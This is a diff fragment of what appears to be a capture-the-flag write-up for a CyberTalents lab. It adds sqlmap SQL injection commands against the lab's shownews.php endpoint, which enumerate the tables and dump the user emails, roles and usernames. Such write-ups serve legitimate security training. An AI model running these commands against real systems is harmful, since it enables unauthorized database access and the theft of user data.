@@ -29,7 +29,11 @@ sqlmap -u "http://cdcamxwl32pue3e6mk873oykcwzy0873o8mombwzy-web.cybertalentslabs
 sqlmap -u "http://cdcamxwl32pue3e6mk873oykcwzy0873o8mombwzy-web.cybertalentslabs.com/shownews.php?id=1" --dump -T nxf8_users -C email,role,username --batch
 ```
 
+```
+sudo sqlmap  -u http://cdcamxwl32pue3e6mk873oykcwzy0873o8mombwzy-web.cybertalentslabs.com/shownews.php?id=1 --batch --dbms=sqlite --tables --dump
+```
 
+<img width="1213" height="583" alt="image" src="https://github.com/user-attachments/assets/4a7c2e7a-f74d-4665-9c78-0df6773380bd" />
 
 
 
